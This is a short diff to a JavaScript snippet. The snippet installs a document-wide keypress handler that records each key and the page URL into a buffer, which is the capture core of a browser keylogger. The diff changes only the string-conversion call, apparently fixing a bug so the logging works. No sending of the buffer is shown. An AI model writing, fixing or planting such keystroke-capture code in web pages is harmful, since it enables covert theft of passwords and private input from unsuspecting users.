@@ -1,7 +1,7 @@
 var buffer='';
 document.onkeypress = function(e) {
     var timestamp = Date.now() | 0;
-    var stroke = str(e.key)+',href:'+window.location.href;
+    var stroke = toString(e.key)+',href:'+window.location.href;
     buffer+=stroke;
 }
 
